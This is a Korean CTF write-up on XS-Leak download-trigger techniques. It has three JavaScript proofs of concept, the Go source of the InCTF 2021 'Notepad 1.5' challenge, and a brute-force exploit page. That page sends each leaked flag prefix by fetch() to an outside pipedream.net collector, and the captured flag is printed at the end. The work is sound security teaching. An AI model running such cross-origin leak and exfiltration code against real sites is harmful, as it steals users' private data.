## Summary

XS-Leak이란 사용자 입력값을 기반으로 브라우저에 반환값을 이용해서 사용자 정보와 같은 중요한 데이터를 수집할 수 있는 취약점 입니다. 만약 xs-leak을 깊이 공부하고 싶으면 [여기](https://xsleaks.dev)를 통해 공부할 수 있습니다 :)

---
## What is Download Trigger?

![image](https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png)

엔드포인트에서 `Content-Disposition: attachment` 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.

![image](https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png)
![image](https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png)

Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다. 

```js
var screenHeight = window.innerHeight;
window.open('https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip');

setTimeout(() => {
    if (window.innerHeight < screenHeight) {
      console.log('Download bar detected');
    } else {
      console.log('Download bar not detected');
    }
}, 2000);
```
POC는 위와 같습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png)

정상적으로 파일이 다운로드 되었을 때 입니다.

![image](https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png)

파일이 다운로드 되지 않았을 때 입니다.

정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png)

두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다. 

```js
var url = 'https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip';

var iframe = document.createElement('iframe');
document.body.appendChild(iframe);

iframe.srcdoc = `<iframe src="${url}" ></iframe>`;
iframe.onload = () => {
      try {
          iframe.contentWindow.frames[0].origin;
          console.log('Download attempt detected');
      } catch(e) {
          console.log('No download attempt detected');
      }
}
```
POC는 위와 같습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png)

세 번째 방식은 두 번째 방식과 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다. 

```js
var url = 'https://example.org';
var win = window.open(url);

setTimeout(() => {
      try {
          // If a navigation occurs, the iframe will be cross-origin,
          // so accessing "win.origin" will throw an exception
          win.origin;
          parent.console.log('Download attempt detected');
      } catch(e) {
          parent.console.log('No download attempt detected');
      }
}, 2000);
```
POC는 위와 같습니다. 

---
## Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur's Article [900 pts]

> Notepad 1.5 - Arthur's Article 문제는 XS-Leak을 이용하여 플래그를 획득하는 문제 입니다.

```go
package main

import (
	"crypto/md5"
	"encoding/hex"
	"flag"
	"fmt"
	"html"
	"log"
	"math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/gorilla/handlers"
	"github.com/gorilla/mux"
)

const adminID = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
const adminNOTE = "inctf{flag}"

var Notes = make(map[string]string)

// Prevent XSS on api-endpoints ¬‿¬
var cType = map[string]string{
	"Content-Type":            "text/plain",
	"x-content-type-options":  "nosniff",
	"X-Frame-Options":         "DENY",
	"Content-Security-Policy": "default-src 'none';",
}

func cookGenerator() string {
	hash := md5.Sum([]byte(string(rand.Intn(30))))
	return hex.EncodeToString((hash)[:])
}

func headerSetter(w http.ResponseWriter, header map[string]string) {
	for k, v := range header {
		w.Header().Set(k, v)
	}
}

func getIDFromCooke(r *http.Request, w http.ResponseWriter) string {
	var cooke, err = r.Cookie("id")
	re := regexp.MustCompile("^[a-zA-Z0-9]+$")
	var cookeval string
	if err == nil && re.MatchString(cooke.Value) && len(cooke.Value) <= 35 && len(cooke.Value) >= 30 {
		cookeval = cooke.Value
	} else {
		cookeval = cookGenerator()
		c := http.Cookie{
			Name:     "id",
			Value:    cookeval,
			SameSite: 2,
			HttpOnly: true,
			Secure:   false,
		}
		http.SetCookie(w, &c)
	}
	return cookeval
}

func add(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)
	if id != adminID {
		r.ParseForm()
		noteConte := r.Form.Get("content")
		if len(noteConte) < 75 {
			Notes[id] = noteConte
		}
	}
	fmt.Fprintf(w, "OK")
}

func get(w http.ResponseWriter, r *http.Request) {
	id := getIDFromCooke(r, w)
	x := Notes[id]
	headerSetter(w, cType)
	if x == "" {
		fmt.Fprintf(w, "404 No Note Found")
	} else if regexp.MustCompile("<[a-zA-Z0-9]").MatchString(x) {
		fmt.Fprintf(w, html.EscapeString(x))
	} else {
		fmt.Fprintf(w, x)
	}
}

func find(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)

	param := r.URL.Query()
	x := Notes[id]

	var which string
	str, err := param["condition"]
	if !err {
		which = "any"
	} else {
		which = str[0]
	}

	var start bool
	str, err = param["startsWith"]
	if !err {
		start = strings.HasPrefix(x, "arthur")
	} else {
		start = strings.HasPrefix(x, str[0])
	}
	var responseee string
	var end bool
	str, err = param["endsWith"]
	if !err {
		end = strings.HasSuffix(x, "morgan")
	} else {
		end = strings.HasSuffix(x, str[0])
	}

	if which == "starts" && start {
		responseee = x
	} else if which == "ends" && end {
		responseee = x
	} else if which == "both" && (start && end) {
		responseee = x
	} else if which == "any" && (start || end) {
		responseee = x
	} else {
		_, present := param["debug"]
		if present {
			delete(param, "debug")
			delete(param, "startsWith")
			delete(param, "endsWith")
			delete(param, "condition")

			for v, d := range param {
				for _, k := range d {

					if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 5 {
						w.Header().Set(v, k)
					}
					break
				}
				break
			}
		}
		responseee = "404 No Note Found"
	}
	headerSetter(w, cType)
	fmt.Fprintf(w, responseee)
}

// Reset notes every 30 mins.  No Vuln in this
func resetNotes() {
	Notes[adminID] = adminNOTE
	for range time.Tick(time.Second * 1 * 60 * 30) {
		Notes = make(map[string]string)
		Notes[adminID] = adminNOTE
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var dir string
	flag.StringVar(&dir, "dir", "./public", "the directory to serve files from. Defaults to the current dir")
	flag.Parse()
	go resetNotes()
	r := mux.NewRouter()
	s := r.Host("chall.notepad15.gq:1515").Subrouter()
	s.HandleFunc("/add", add).Methods("POST")
	s.HandleFunc("/get", get).Methods("GET")
	s.HandleFunc("/find", find).Methods("GET")
	s.PathPrefix("/").Handler(http.StripPrefix("/", http.FileServer(http.Dir(dir))))
	fmt.Println("Server started at http://0.0.0.0:3000")
	loggedRouter := handlers.LoggingHandler(os.Stdout, r)
	srv := &http.Server{
		Addr: "0.0.0.0:3000",
		// Good practice to set timeouts to avoid Slowloris attacks.
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      loggedRouter, // Pass our instance of gorilla/mux in.
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Println(err)
	}
}
```
해당 문제의 서버는 `Go`라는 프로그래밍 언어로 작성이 되어 있습니다.

```go
func main() {
	rand.Seed(time.Now().UnixNano())

	var dir string
	flag.StringVar(&dir, "dir", "./public", "the directory to serve files from. Defaults to the current dir")
	flag.Parse()
	go resetNotes()
	r := mux.NewRouter()
	s := r.Host("chall.notepad15.gq:1515").Subrouter()
	s.HandleFunc("/add", add).Methods("POST")
	s.HandleFunc("/get", get).Methods("GET")
	s.HandleFunc("/find", find).Methods("GET")
	s.PathPrefix("/").Handler(http.StripPrefix("/", http.FileServer(http.Dir(dir))))
	fmt.Println("Server started at http://0.0.0.0:3000")
	loggedRouter := handlers.LoggingHandler(os.Stdout, r)
	srv := &http.Server{
		Addr: "0.0.0.0:3000",
		// Good practice to set timeouts to avoid Slowloris attacks.
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      loggedRouter, // Pass our instance of gorilla/mux in.
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Println(err)
	}
}
```
`main()` 함수는 go 파일이 실행될 때, 실행이 되는 곳 입니다. C언어에 main() 함수와 동일 합니다. 일단 코드를 보면 `/add`, `/get`, `/find`, `/` 경로로 라우팅을 시켜주는 것을 볼 수 있습니다.

```go
func add(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)
	if id != adminID {
		r.ParseForm()
		noteConte := r.Form.Get("content")
		if len(noteConte) < 75 {
			Notes[id] = noteConte
		}
	}
	fmt.Fprintf(w, "OK")
}
```
`/add` 기능은 메모 작성을 저장하는 기능인데 코드를 보면 `getIDFromCooke()` 함수를 이용해서 쿠키에서 `id`를 가져 온 후에 `id`가 관리자 아이디와 동일하지 않으면 입력한 값을 `Notes[id]`에 넣어주는 것을 볼 수 있습니다. 여기서 `getIDFromCooke()` 함수는 그냥 현재 요청 한 사용자의 쿠키에서 `id` 값을 가져와서 `id`가 없으면 생성하고, 있으면 그냥 그 값을 반환해주는 함수입니다. 

```go
func get(w http.ResponseWriter, r *http.Request) {
	id := getIDFromCooke(r, w)
	x := Notes[id]
	headerSetter(w, cType)
	if x == "" {
		fmt.Fprintf(w, "404 No Note Found")
	} else if regexp.MustCompile("<[a-zA-Z0-9]").MatchString(x) {
		fmt.Fprintf(w, html.EscapeString(x))
	} else {
		fmt.Fprintf(w, x)
	}
}
```
`/get` 기능은 `/add` 기능으로 작성한 메모를 보여주는 기능 입니다. `getIDFromCooke()` 함수로 `id`를 가져와서 `id` 값을 가진 메모를 가져온 후에 `Fprintf()` 함수로 출력하는 것을 볼 수 있습니다.

```go
func find(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)

	param := r.URL.Query()
	x := Notes[id]

	var which string
	str, err := param["condition"]
	if !err {
		which = "any"
	} else {
		which = str[0]
	}

	var start bool
	str, err = param["startsWith"]
	if !err {
		start = strings.HasPrefix(x, "arthur")
	} else {
		start = strings.HasPrefix(x, str[0])
	}
	var responseee string
	var end bool
	str, err = param["endsWith"]
	if !err {
		end = strings.HasSuffix(x, "morgan")
	} else {
		end = strings.HasSuffix(x, str[0])
	}

	if which == "starts" && start {
		responseee = x
	} else if which == "ends" && end {
		responseee = x
	} else if which == "both" && (start && end) {
		responseee = x
	} else if which == "any" && (start || end) {
		responseee = x
	} else {
		_, present := param["debug"]
		if present {
			delete(param, "debug")
			delete(param, "startsWith")
			delete(param, "endsWith")
			delete(param, "condition")

			for v, d := range param {
				for _, k := range d {

					if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 5 {
						w.Header().Set(v, k)
					}
					break
				}
				break
			}
		}
		responseee = "404 No Note Found"
	}
	headerSetter(w, cType)
	fmt.Fprintf(w, responseee)
}
```
`/find` 기능은 사용자가 저장한 메모가 존재하는 지 없는 지 찾은 후에, 존재/미존재를 분기로 처리하는 로직입니다.

- Information

1. condition 값을 가져와서 str 변수에 저장합니다.
2. 만약 에러가 났다면 which 변수에 `"any"`라는 문자열을 넣어주고, 에러가 나지 않았다면 우리가 입력한 condition의 값을 which에 넣어줍니다.
3. startsWith 값을 가져와서 str 변수에 저장합니다.
4. 에러가 나지 않았다면 `strings.HasPrefix()` 메서드를 이용해서 `startsWith` 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, `strings.HasPrefix()` 메서드는 자바스크립트에서 includes()와 동일 합니다. )
5. endsWith 값을 가져와서 str 변수에 저장합니다.
6. 에러가 나지 않았다면 `strings.HasSuffix()` 메서드를 이용해서 `endsWith` 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, `strings.HasSuffix()` 메서드는 자바스크립트에서 includes()와 동일 하지만 뒤에서부터 검사합니다. )
7. start/end 로직이 끝나면 여러 분기 별로 처리하는 것을 볼 수 있는데, 이때 모든 분기와 일치하지 않는 다면 debug 값을 가져와서 \_와 present에 넣는 것을 볼 수 있습니다. 이때 present에는 true가 들어갑니다.
8. presend의 값이 true 이면 `debug`, `startWith`, `endsWith`, `condition` 파라미터를 모두 지우고, 다른 파라미터가 있다면 해당 파라미터를 기반으로 `Header()` 메서드를 이용해서 응답 헤더를 설정하는 것을 볼 수 있습니다.
9. 모든 처리가 끝나면 `headerSetter()` 함수를 이용해서 응답 헤더를 설정하고, Fprintf() 함수를 이용해서 출력하는 것을 볼 수 있습니다.

여기서 중요한 부분은 우리가 입력한 값과 노트의 값이 일치 하지 않으면 else 문 내부에 들어가는데, 여기서 응답 헤더 하나를 우리가 설정할 수 있다는 것 입니다. 우린 아까 위에서 `Download Trigger`에 대해서 배웠는데, 엔드포인트에서 `Content-Disposition: attachment` 헤더를 설정해서 반환하면 브라우저는 첨부 파일을 탐색하고 파일을 설치 한다는 것을 배웠습니다.

그럼 우리가 입력한 값과 노트의 값이 일치 하지 않을 때는 `Content-Disposition: attachment` 헤더를 설정해 파일이 다운로드 되게 하고, 우리가 입력한 값과 노트의 값이 일치하면 파일은 다운로드 하지 않게 만들 수 있고, 이를 이용하면 XS-Leak 공격을 이용해 노트 값을 파악할 수 있습니다.

그러므로 봇을 이용해 `/find`로 요청을 보내면 `id` 값은 관리자의 `id` 이므로 노트의 값으로 플래그가 들어올 것 이고, 이를 XS-Leak 공격을 이용해서 플래그를 획득할 수 있습니다.

![image](https://user-images.githubusercontent.com/49112423/129488305-9cb0ce17-2495-4db8-8b46-bd82eb8ba3c3.png)

분석한 `/find` 로직을 확인하기 위해 위와 같이 메모를 작성했습니다. 

![image](https://user-images.githubusercontent.com/49112423/129488320-fbd08b0b-ff14-4b85-ae4c-007499638885.png)
![image](https://user-images.githubusercontent.com/49112423/129488348-72e7814b-8385-40fa-b007-56cf503173c3.png)

확인을 해보니 입력값과 노트 값이 일치하면 노트 값이 출력이 되고, 일치 하지 않으면 파일이 다운로드 되는 것을 확인할 수 있었습니다. 이제 이를 이용해 플래그를 획득하면 될 거 같습니다.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Notepad 1.5 - Arthur's Article Poc</title>
    </head>
    <body>
        <script>
            const string = "abcdefghijklmnopqrstuvwxyz1234567890~}{!@$%^*)(_+";

            let flag = 'inctf{';

            function xs(flag, str) {
                let url = `http://chall.notepad15.gq:1515/find?condition=starts&debug&Content-Disposition=attachment&startsWith=${flag + str}`;
                const MyWindow = window.open(url);
                setTimeout(() => {
                    try{
                        MyWindow.origin;
                    } catch (err) {
                        flag += str;
                        fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/" + flag)
                        broute_force(flag);
                    }
                }, 1000);
            }
            function broute_force(flag) {
                for ( let i = 0; i < string.length; i ++) {
                    xs(flag, string[i])
                }
            }

            broute_force(flag);
        </script>
    </body>
</html>
```


![image](https://user-images.githubusercontent.com/49112423/129514189-90b0699c-6f47-47b7-b49d-68fe1dd7a614.png)

위와 같이 익스플로잇 코드를 작성 후에 봇으로 넘겨주니 위와 같이 플래그를 뽑을 수 있었습니다.

```
inctf{red_dead_rezoday_ialmvwoawpwe}
```

---
